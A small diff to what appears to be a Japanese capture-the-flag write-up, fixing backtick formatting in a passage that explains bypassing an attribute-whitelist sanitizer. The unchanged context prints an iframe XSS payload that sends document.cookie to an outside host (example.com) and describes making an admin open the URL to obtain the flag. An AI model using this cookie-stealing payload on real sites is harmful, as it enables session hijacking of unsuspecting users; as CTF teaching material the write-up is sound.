@@ -32,7 +32,7 @@ function sanitize(element) {
 }
 ```
 
-```src, width, height, alt, class``以外の属性は削除され、scriptタグも削除される。
+`src, width, height, alt, class`以外の属性は削除され、scriptタグも削除される。
 しかし、iframeタグを使うことができるので`<iframe src="javascript:window.location.href='https://example.com/?'+document.cookie>"`を入力してやれば良い。
 あとはstatic-pastebinと同じようにadminにURLを踏ませればフラグが手に入る
 
